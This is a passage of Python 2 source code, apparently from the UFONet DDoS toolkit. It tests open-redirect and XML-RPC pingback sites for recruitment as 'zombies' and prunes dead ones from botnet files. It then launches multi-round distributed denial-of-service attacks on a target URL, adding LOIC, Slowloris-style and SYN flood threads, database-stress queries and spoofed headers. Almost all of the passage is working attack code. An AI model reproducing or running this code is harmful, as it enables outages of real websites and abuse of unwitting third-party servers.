            print "\nName:", name_zombie
            print "Type: [", zombie_type, "]"
            print "Vector:", zombie
            print "HTTP Code:", reply
            print "STATUS:", status
            print '-'*21
            if status == "NOT Working!": # add to discarded zombies
                if zombie not in discarded:
                    discarded.append(zombie)
        print "\n" + '='*52
        print "\n+ Total Botnet:", len(botnet)
        print "\n" + '-'*25 + "\n"
        print "  - ONLINE:", zombies_online
        print "  - OFFLINE:", zombies_offline, "\n"
        print '='*52 + '\n'
        self.head = False
        if zombies_offline > 0:
            if not self.options.forceyes:
                test_reply = raw_input("Want to update your army? (Y/n)\n")
                print '-'*25 + "\n"
            else:
                test_reply = "Y"
            if test_reply == "n" or test_reply == "N":
                print "Bye!\n"
                return
            else:
                disc_zombies = self.discard_zombies(discarded) # discard zombies from botnet (remove from files)
                print '='*52
                print "\n  - DISCARDED:", disc_zombies
                new_botnet = int(len(botnet) - disc_zombies)
                print "\n+ New Total Botnet:", str(new_botnet), "\n"
                print '='*52 + '\n'
        else:
            print "[Info] ALL checked 'zombies' are ONLINE... Exiting!\n"

    def discard_zombies(self, discarded):
        disc_zombies = 0
        zombies_list = [self.zombies_file, self.aliens_file, self.droids_file, self.ucavs_file, self.rpcs_file]
        for l in zombies_list:
            f = open(l, "r+")
            d = f.readlines()
            f.close()
            f = open(l, "w")
            disc_zombies = self.remove_discarded_zombies(f, d, discarded, disc_zombies)
            f.close()
        return disc_zombies

    def remove_discarded_zombies(self, f, d, discarded, disc_zombies):
        m = []
        for zombie_disc in discarded:
            if zombie_disc.endswith(os.linesep):
                zombie_disc = zombie_disc.replace(os.linesep, "")
            elif zombie_disc.endswith("\r"):
                zombie_disc = zombie_disc.replace("\r", "")
            elif zombie_disc.endswith("\r" + os.linesep):
                zombie_disc = zombie_disc.replace("\r" + os.linesep, "")
            for z in d:
                if z.endswith(os.linesep):
                    z = z.replace(os.linesep, "")
                elif z.endswith("\r"):
                    z = z.replace("\r", "")
                elif z.endswith("\r" + os.linesep):
                    z = z.replace("\r" + os.linesep, "")
                if z == zombie_disc:
                    disc_zombies = disc_zombies + 1
                else:
                    if z not in m and z not in discarded:
                        m.append(z)
        if not m:
            f.write("")
        else:
            for z in m:
                f.write(z+os.linesep)
        return disc_zombies

    def testing_rpcs(self, rpcs):
        # discover/test XML-RPC Pingback vulnerabilities on webapps (Wordpress, Drupal, PostNuke, b2evolution, 
        # Xoops, PHPGroupWare, TikiWiki, etc...) and update list
        if self.options.testall: #testing_all
            print '='*51
        print ("Are 'plasma' reflectors ready? :-) (XML-RPC Check):")
        print '='*51
        num_active_rpcs = 0
        num_failed_rpcs = 0
        rpcs_ready = []
        print "Trying:", len(rpcs)
        print '-'*21
        for rpc in rpcs:
            self.user_agent = random.choice(self.agents).strip() # shuffle user-agent
            headers = {'User-Agent' : self.user_agent, 'Referer' : self.referer} # set fake user-agent and referer
            if rpc.startswith("http://") or rpc.startswith("https://"):
                print "Searching 'Pingback' on", rpc
                rpc_host = rpc.replace("/xmlrpc.php", "")
                rpc_vulnerable, rpc_pingback_url = self.search_rpc(rpc_host)
                if rpc_vulnerable == True: # discover XML-RPC system.listMethods allowed
                    rpc_methods = "<methodCall><methodName>system.listMethods</methodName><params></params></methodCall>"
                    try:
                        req = urllib2.Request(rpc_pingback_url, rpc_methods, headers)
                        target_reply = urllib2.urlopen(req, context=self.ctx).read()
                        if self.options.verbose:
                            print "Reply:", target_reply
                        if "pingback.ping" in target_reply: # XML-RPC pingback.ping method is allowed!
                            print "\n[Info] It looks VULNERABLE !!! ;-)"
                            rpcs_ready.append(rpc_pingback_url) # save XML-RPC path as RPC zombie
                            num_active_rpcs = num_active_rpcs + 1 # add fail to rpcs stats
                        else:
                            print "\n[Info] It is NOT vulnerable..."
                            num_failed_rpcs = num_failed_rpcs + 1 # add fail to rpcs stats
                    except:
                        print "[Error] X-RPC: " + rpc + " -> FAILED (cannot connect!)"
                        num_failed_rpcs = num_failed_rpcs + 1 # add fail to rpcs stats
                else:
                    print "\n[Info] It is NOT vulnerable..."
                    num_failed_rpcs = num_failed_rpcs + 1 # add fail to rpcs stats
            print '-'*10
        print '='*18
        print "OK:", num_active_rpcs, "Fail:", num_failed_rpcs
        print '='*18
        if self.options.testall: # testing_all
            return rpcs_ready, num_active_rpcs, num_failed_rpcs
        else:
            # update 'rpcs' list
            if num_active_rpcs == 0:
                print "\n[Info] - Not any vulnerable 'rpc' active!\n"
                return #sys.exit(2)
            else:
                if not self.options.forceyes:
                    update_reply = raw_input("Want to update your army? (Y/n)")
                    print '-'*25
                else:
                    update_reply = "Y"
                if update_reply == "n" or update_reply == "N":
                    print "\nBye!\n"
                    return #sys.exit(2)
                else:
                    self.update_rpcs(rpcs_ready)
                    if not self.options.upload:
                        print "\n[Info] - Botnet updated! ;-)\n"

    def testing(self, zombies):
        # test Open Redirect vulnerabilities on webapps and show statistics
        # HTTP HEAD check
        army = 0
        print ("Are 'they' alive? :-) (HEAD Check):")
        print '='*35
        num_active_zombies = 0
        num_failed_zombies = 0
        active_zombies = []
        print "Trying:", len(zombies)
        print '-'*21
        for zombie in zombies:
            zombie = str(zombie)
            if zombie.startswith("http://") or zombie.startswith("https://"):
                # send HEAD connection
                self.head = True
                reply = self.connect_zombies(zombie)
        while self.herd.no_more_zombies() == False:
            time.sleep(1)
        for zombie in self.herd.done:
            zombie = str(zombie)
            t = urlparse(zombie)
            if self.herd.get_result(zombie):
                code_reply = self.herd.get_result(zombie)
                self.head = False
                if code_reply == "200" or code_reply == "302" or code_reply == "301" or code_reply == "401" or code_reply == "403" or code_reply == "405":
                    name_zombie = t.netloc
                    print "Zombie:", name_zombie
                    print "Status: Ok ["+ code_reply + "]"
                    num_active_zombies = num_active_zombies + 1
                    active_zombies.append(zombie)
                elif code_reply == "404":
                    print "Zombie:", t.netloc
                    print "Status: Not Found ["+ code_reply + "]"
                    num_failed_zombies = num_failed_zombies + 1
                else:
                    print "Zombie:", t.netloc, "\nVector:", zombie
                    print "Status: Not Allowed ["+ code_reply + "]"
                    num_failed_zombies = num_failed_zombies + 1
            else:
                if self.options.verbose:
                    print "Reply:", "\n\nNothing!!!!!\n"
                print "Zombie:", zombie
                print "Status: Malformed!"
                num_failed_zombies = num_failed_zombies + 1
            print '-'*10
        self.herd.reset()
        print '='*18
        print "OK:", num_active_zombies, "Fail:", num_failed_zombies
        print '='*18 + "\n"
        print '='*22
        # check url parameter vectors
        print ("Checking for payloads:")
        print '='*22
        print "Trying:", num_active_zombies
        print '-'*21
        zombies_ready = []
        num_waiting_zombies = 0
        if num_active_zombies == 0:
            num_disconnected_zombies = num_failed_zombies
        else:
            num_disconnected_zombies = 0
        for zombie in active_zombies:
            zombie = str(zombie)
            t = urlparse(zombie)
            name_zombie = t.netloc
            self.payload = True
            try:
                self.connect_zombies(zombie)
            except:
                pass
            self.payload = False
        time.sleep(1)
        while self.herd.no_more_zombies() == False:
            time.sleep(1)
        for zombie in self.herd.done:
            zombie = str(zombie)
            t = urlparse(zombie)
            name_zombie = t.netloc
            payload_zombie = zombie
            payload_reply = ""
            print "Vector:", payload_zombie
            self.payload = True
            if self.herd.get_result(zombie):
                payload_reply = self.herd.get_result(zombie)
            self.payload = False
            if "https://www.whitehouse.gov" in payload_reply: #Open Redirect reply [requested by all UFONet motherships ;-)]
                num_waiting_zombies = num_waiting_zombies + 1
                print "Status:", "Waiting for orders..."
                zombies_ready.append(zombie)
            else:
                num_disconnected_zombies = num_disconnected_zombies + 1
                print "Status:", "Not ready..."
            army = army + 1
            print '-'*10
        self.herd.reset()
        print '='*18
        print "OK:", num_waiting_zombies, "Fail:", num_disconnected_zombies
        print '='*18 + "\n"
        # list of 'zombies' ready to attack
        num_active_zombie = 0
        for z in zombies_ready:
            t = urlparse(z)
            name_zombie = t.netloc
            num_active_zombie = num_active_zombie + 1
            if self.options.verbose:
                print "Zombie [", num_active_zombie, "]:", name_zombie + "\n"
        if self.options.testall: # testing_all
            return zombies_ready, num_waiting_zombies, num_disconnected_zombies + num_failed_zombies
        else:
            print '-'*25 + "\n"
            print '='*24
            print "Working 'zombies':", num_active_zombie
            print '='*24
            if not self.options.forceyes:
                update_reply = raw_input("\nWant to update your army? (Y/n)")
                print '-'*25
            else:
                update_reply = "Y"
            if update_reply == "n" or update_reply == "N":
                print "\nBye!\n"
                return #sys.exit(2)
            else:
                self.update_zombies(zombies_ready)
                if not self.options.upload:
                    print "\n[Info] - Botnet updated! ;-)\n"
                    self.update_scanner_stats(self.scanned_zombies) # update json file with scanner stats (found via dorking)

    def testing_all(self):
        # test whole botnet
        print ("\nChecking if ALL your zombies are still infected (WARNING: this may take serveral time!)\n")
        print '='*35
        zombies = self.extract_zombies()
        rpcs = self.extract_rpcs()
        aliens = self.extract_aliens()
        droids = self.extract_droids()
        ucavs = self.extract_ucavs()
        try:
            botnet = zombies + rpcs + aliens + droids + ucavs
            tested_zombies = zombies + rpcs # test types supported: zombies + xml-rpcs
        except:
            return
        zombies_ready, num_waiting_zombies, num_disconnected_zombies = self.testing(zombies)
        rpcs_ready, num_active_rpcs, num_failed_rpcs = self.testing_rpcs(rpcs)
        print "\n" + '='*52
        print "\n+ Total Botnet:", len(botnet)
        print "\n" + '-'*25
        print "\n+ Total Tested:", len(tested_zombies)
        print "\n  - Zombies :", len(zombies), " [ OK:", str(num_waiting_zombies), "| FAILED:", str(num_disconnected_zombies), "]"
        print "  - XML-RPCs:", len(rpcs), " [ OK:", str(num_active_rpcs), "| FAILED:", str(num_failed_rpcs), "]" + "\n"
        print '='*52 + '\n'
        if num_disconnected_zombies > 0 or num_failed_rpcs > 0:
            if not self.options.forceyes:
                update_reply = raw_input("Want to update your army? (Y/n)")
                print '-'*25
            else:
                update_reply = "Y"
            if update_reply == "n" or update_reply == "N":
                print "\nBye!\n"
                return #sys.exit(2)
            else:
                if num_disconnected_zombies > 0:
                    self.update_zombies(zombies_ready)
                if num_failed_rpcs > 0:
                    self.update_rpcs(rpcs_ready)
                if not self.options.upload:
                    print "\n[Info] - Botnet updated! ;-)\n"
        else:
            print "[Info] ALL tested 'zombies' are working... Exiting!\n"

    def attacking(self, zombies):
        # perform a DDoS Web attack against a target, using Open Redirect vectors (and other Web Abuse services) as 'zombies'
        target = self.options.target
        if self.options.forcessl:
            if target.startswith("http://"):
                target = target.replace("http://", "https://") # force SSL/TLS 
        if target.startswith("http://") or target.startswith("https://"):
            print "Attacking:", target
            print '='*55, "\n"
            # send Open Redirect injection (multiple zombies > one target url)
            reply = self.injection(target, zombies)
        else:
            print "\n[Error] - Target url not valid! -> It should starts with 'http(s)://'\n"

    def aiming_extra_weapons(self, target, proxy, loic, loris, ufosyn):
        # perform some other extra attacks (such as DoS techniques)
        time.sleep(2) # aiming (multi-threading flow time compensation)
        if loic:
            try:
                self.options.loic = int(loic)
            except:
                self.options.loic = 100 # default LOIC requests
            if self.options.loic < 1:
                self.options.loic = 100
            self.instance = LOIC() # instance main class for LOIC operations
            t = threading.Thread(target=self.instance.attacking, args=(target, self.options.loic, proxy)) # LOIC using threads + proxy
            t.daemon = True
            t.start()
            self.update_loic_stats() # add new LOIC attack to mothership
        if loris:
            try:
                self.options.loris = int(loris)
            except:
                self.options.loris = 101 # default LORIS requests (apache -> max_clients: ~100 | nginx -> no limit (other method))
            if self.options.loris < 1:
                self.options.loris = 101 
            self.instance = LORIS() # instance main class for LORIS operations
            t2 = threading.Thread(target=self.instance.attacking, args=(target, self.options.loris)) # LORIS using threads
            t2.daemon = True
            t2.start()
            self.update_loris_stats() # add new LORIS attack to mothership
        if ufosyn:
            try:
                self.options.ufosyn = int(ufosyn)
            except:
                self.options.ufosyn = 100 # default UFOSYN requests
            if self.options.ufosyn < 1:
                self.options.ufosyn = 100 
            self.instance = UFOSYN() # instance main class for UFOSYN operations
            t3 = threading.Thread(target=self.instance.attacking, args=(target, self.options.ufosyn)) # UFOSYN using threads
            t3.daemon = True
            t3.start()
            self.update_ufosyn_stats() # add new UFOSYN attack to mothership

    def stressing(self, target, zombie):
        # perform a DDoS Web attack against a target, requesting records on target's database
        db_input = self.options.dbstress
        def random_key(length):
            key = ''
            for i in range(length):
                key += random.choice(string.lowercase + string.uppercase + string.digits)
            return key
        # generating random alphanumeric queries
        if self.db_flash > 9: # set db flash start on: 10
            length = 1024 # search a heavy random length query (db flash): 1024
            self.db_flash = 0 # reset db flash counter
        else:
            length = 1 # search for one different (alphanumeric) character each time will produces more positive results on db
        key = str(random_key(length))
        if self.db_flash > 9:
            print "\n[Info] Trying database request to: " + db_input + " | Query used: db flash! " + "(" + str(length) + " chars)"
        else:
            print "\n[Info] Trying database request to: " + db_input + " | Query used: " + key
        self.user_agent = random.choice(self.agents).strip() # shuffle user-agent
        headers = {'User-Agent' : self.user_agent, 'Referer' : self.referer} # set fake user-agent and referer
        if not target.endswith('/'): # add "/" to end of target
            target = target + "/"
        url = zombie + target + db_input + key
        req = urllib2.Request(url, None, headers)
        try:
            req_reply = urllib2.urlopen(req).read()
        except urllib2.HTTPError, e:
            if e.code == 401:
                print '[Info] Not authorized'
            elif e.code == 404:
                print '[Info] Not found'
            elif e.code == 503:
                print '[Info] Service unavailable'
            else:
                print '[Info] Unknown error'
        else:
            print '[Info] DB query: Hit!'

    def attackme(self, zombies):
        # perform a DDoS Web attack against yourself
        print "Starting local port to listening at: " + self.port + "\n" 
        print '='*21 + "\n"
        self.doll=Doll(self)
        self.doll.start()
        while not self.doll._armed:
            time.sleep(1)
        # send Open Redirect injection (multiple zombies-multiple target urls)
        target = ""
        self.injection(target, zombies)
        self.doll.shutdown()
        self.doll.join()
        self.herd.list_fails()

    def injection(self, target, zombies, head_check = True):
        options = self.options
        head_check_here = False
        head_check_external = False
        print '='*22
        if options.disablehead: # check at start is disabled (skipping!)
            print "\n[Info] Skipping external check of target's status...\n"
            head_check_here = True
            head_check_external = True
        else:
            if head_check:
                if not options.attackme:
                    print "Round: 'Is target up?'"
                    print '='*22
                    try: # send HEAD connection
                        self.head = True
                        reply = self.connect_zombie(target)
                        self.head = False
                        if reply:
                            print "[Info] From here: YES"
                            head_check_here = True
                        else:
                            print "[Error] From here: NO | Report: From your network your target looks DOWN!..."
                            head_check_here = False
                    except Exception:
                        print "[Error] From here: NO | Report: Cannot reach your target from your network..."
                        if self.options.verbose:
                            traceback.print_exc()
                        head_check_here = False
                else: # check if local IP/PORT is listening on mothership
                    print "Round: 'Is NAT ready?'"
                    print '='*21
                    try:
                        sock = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
                        result = sock.connect_ex(('0.0.0.0',8080))
                        if result == 0 or result == 110: # black magic
                            print "[Info] Local port: YES | Report: Mothership accesible on -private- IP: http://0.0.0.0:8080"
                            head_check_here = True
                        else:
                            print "[Error] Local port: NO | Report: Something wrong on your port: 8080"
                            head_check_here = False
                    except Exception:
                        print "[Error] Local port: NO | Report: Something wrong checking open port ;("
                        if self.options.verbose:
                            traceback.print_exc()
                        head_check_here = False
                print '-'*21
            else:
                head_check_here = True
            # check target on third part service
            self.external = True
            if not options.attackme:
                try:
                    external_reply = self.connect_zombie(target)
                    if "It's just you" in external_reply: # parse from external service: http://www.downforeveryoneorjustme.com
                        print "[Info] From exterior: YES"
                        head_check_external = True
                    else: # parse from external service: http://isup.me [29/08/2018 -> DEPRECATED!] | https://status.ws/
                        url = "https://status.ws/" + target
                        self.user_agent = random.choice(self.agents).strip() # shuffle user-agent
                        headers = {'User-Agent' : self.user_agent, 'Referer' : self.referer} # set fake user-agent and referer
                        req = urllib2.Request(url, None, headers)
                        req_reply = urllib2.urlopen(req).read()
                        if 'may be just down for you' in req_reply: # parse external service for reply
                            print "[Info] From exterior: YES"
                            head_check_external = True
                        else:
                            print "[Error] From exterior: NO | Report: From external services your target looks DOWN!"
                            head_check_external = False
                except Exception:
                        print "[Error] From exterior: NO | Report: Cannot reach external services from your network..."
                        head_check_external = False
            else:
                try: # check mothership from public ip / NAT using HEAD request
                    try:
                        conn = httplib.HTTPConnection(str(self.pub_ip), 8080, timeout=10)
                        conn.request("HEAD", "/")
                        reply = conn.getresponse() 
                    except Exception:
                        reply = None
                    if reply:
                        print "[Info] From exterior: YES | Report: Mothership accesible from the Internet ;-) ["+str(self.pub_ip)+":8080]"
                        head_check_external = True
                    else:
                        print "[Error] From exterior: NO | Report: Cannot access to the mothership using a public IP. Your NAT configuration is not working correctly:", target
                        head_check_external = False
                        head_check_here = False # stop attack if not public IP available
                except Exception:
                    print "[Error] From exterior: NO | Report: Check failed from your connection..."
                    head_check_here = False # stop attack if not public IP available
                    if self.options.verbose:
                        traceback.print_exc()
                    head_check_external = False
            print '-'*21 + "\n"
            self.external = False
        # ask for start the attack
        if head_check_here == True or head_check_external == True:
            if not self.options.forceyes: 
                if not options.attackme:
                    if not options.disablehead:
                        start_reply = raw_input("[Info] Your target looks ONLINE!. Want to start a DDoS attack? (y/N)\n")
                    else:
                        start_reply = raw_input("[Info] Want to start a DDoS attack directly? (y/N)\n")
                else:
                    if not options.disablehead:
                        start_reply = raw_input("[Info] Your mothership looks READY!. Want to start a DDoS attack against yourself? (y/N)\n")
                    else:
                        start_reply = raw_input("[Info] Want to start a DDoS attack against yourself directly? (y/N)\n")
            else:
                start_reply = "Y"
            if start_reply == "y" or start_reply == "Y":
                if options.attackme:
                    total_rounds = "2" # default rounds for attackme
                else:
                    total_rounds = options.rounds # extract number of rounds
                if total_rounds <= "0":
                    total_rounds = "1"
		self.herd.cleanup()
                num_round = 1
                num_hits = 0
                num_zombie = 1
                t = threading.Thread(target=self.aiming_extra_weapons, args=(target, self.options.proxy, self.options.loic, self.options.loris, self.options.ufosyn)) # multithreading flow for extra attacks
                t.daemon = True
                t.start()
                # start to attack the target with each zombie
                zombies = self.extract_zombies() # extract zombies from file
                total_zombie = len(zombies)
                self.herd=Herd(self)
                for i in range(0, int(total_rounds)):
                    print ("\x1b[2J\x1b[H")# clear screen (black magic)
                    print '='*42
                    print 'Starting round:', num_round, ' of ', total_rounds
                    print '='*42
                    if not self.options.disablealiens and not self.options.attackme: # different layers requests -> pure web abuse 
                        send_aliens = self.send_aliens(target)
                    if not self.options.disabledroids and not self.options.attackme: # GET (with parameter required) requests 
                        send_droids = self.send_droids(target)
                    if not self.options.disablerpcs and not self.options.attackme: # exploit XML-RPC pingback vulnerability 
                        send_rpcs = self.send_rpcs(target)
                    shuffle(zombies) # shuffle zombies order, each round :-)
                    self.herd.reset()
                    print "\n[Info] Sending your 'herd' of zombies...\n"
                    for zombie in zombies:
                        t = urlparse(zombie)
                        name_zombie = t.netloc
                        if not self.options.attackme:
                            print "[Info] Attacking from: " + name_zombie
                        else: # on attackme, target url is dynamic -> http://public_ip:port/hash|zombie
                            self.mothership_hash = random.getrandbits(128) # generating random evasion hash  
                            target = "http://" + str(self.pub_ip) + ":" + self.port + "/"+ str(self.mothership_hash) + "|" + zombie
                            self.options.target = target
                            print "Attacking: " + str(self.pub_ip) + ":" + self.port + " -> [LAN]" + self.local_ip + ":" + self.port
                            print "Payload: " + target
                            print '='*55, "\n"
                        self.attack_mode = True
                        self.user_agent = random.choice(self.agents).strip() # shuffle user-agent
                        if not options.target.startswith('http'):
                            if options.forcessl:
                                options.target = "https://" + options.target
                            else:
                                options.target = "http://" + options.target
                        self.connect_zombies(zombie)
                        if self.options.dbstress: # try to stress db on target by using vulnerable Open Redirect web servers
                            self.db_flash = self.db_flash + 1
                            stress = self.stressing(target, zombie)
                    time.sleep(1)
                    for zombie in self.herd.done:
                        if self.herd.connection_failed(zombie) == False:
                            num_hits = num_hits + 1
                        num_zombie = num_zombie + 1
                        if num_zombie > total_zombie:
                            num_zombie = 1
                    while self.herd.no_more_zombies() == False:
                        time.sleep(1)
                    num_round = num_round + 1
                    if not self.options.disableisup and not self.options.attackme: # perform an external 'is target up?' check 
                        check_is_up = self.check_is_up(target)
                    if not self.options.attackme: # perform a broadband test on target
                        check_is_loading = self.check_is_loading(target)
                    print "-"*21
                    self.herd.dump_html()
                attack_mode = False
                print ("\x1b[2J\x1b[H") # black magic
                if not self.options.attackme: # show herd results
                    self.herd.dump()
                else: # show doll results
                    print '='*21
                    print "\n[Info] - Mothership transmission...\n"
                    num_real_zombies = len(self.doll.real_zombies)
                    print "Total of 'zombies' 100% vulnerable to Open Redirect (CWE-601): " + str(num_real_zombies) + "\n"
                    for z in self.doll.real_zombies: # show only alien verified zombies
                        for x in z:
                            print " - " + str(x)
                self.herd.dump_html(True) # show (all) zombies statistics
                if not self.options.attackme:
                    print "\n[Info] - Attack completed! ;-)\n"
                    self.update_mothership_stats() # update mothership stats
                else:
                    if num_real_zombies < 1: # not any 100% vulnerable zombie found
                        print "\n[Info] - Not any 100% vulnerable zombie found... Bye!\n"
                        if os.path.exists('mothership') == True:
                            os.remove('mothership') # remove mothership stream
                        if os.path.exists('alien') == True:
                            os.remove('alien') # remove random alien worker
                        sys.exit(2)
            else:
                print "\nBye!\n"
                if os.path.exists('mothership') == True:
                    os.remove('mothership') # remove mothership stream
                if os.path.exists('alien') == True:
                    os.remove('alien') # remove random alien worker
                if not options.web:
                    sys.exit(2) # exit
                else:
                    return
        else:
            if not options.attackme:
                print "="*75
                print "[Info] Your target ("+target+") looks OFFLINE!! ;-)" 
                print "="*75
            else:
                print "[Error] Your NAT/Network is not correctly configurated..."
            print '-'*25
            print "\nBye!\n"
            if os.path.exists('mothership') == True:
                os.remove('mothership') # remove mothership stream
            if os.path.exists('alien') == True:
                os.remove('alien') # remove random alien worker
            return

if __name__ == "__main__":
    app = UFONet()
    options = app.create_options()
    if options:
        app.run()
